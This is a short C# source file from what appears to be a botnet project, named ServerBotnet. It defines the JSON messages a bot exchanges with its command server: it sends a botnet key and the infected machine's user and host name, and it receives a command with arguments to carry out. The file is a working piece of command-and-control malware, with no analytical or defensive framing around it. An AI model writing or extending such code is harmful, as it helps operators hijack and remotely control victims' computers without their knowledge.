﻿using System;
using System.Collections.Generic;
using Newtonsoft.Json;

namespace ServerBotnet
{
    internal class GetCommandFromServerRequestJson
    {
        public string host_key { get; set; } = BotnetManager.KEY;

        public string name { get; set; } = $"{Environment.UserName}@{Environment.MachineName}";
    }

    internal class GetCommandFromServerResponseJson
    {
        [JsonProperty(Required = Required.Always)]
        public string command { get; set; }
        
        [JsonProperty(Required = Required.Always)]
        public Dictionary<string, string> arguments { get; set; }
    }
}
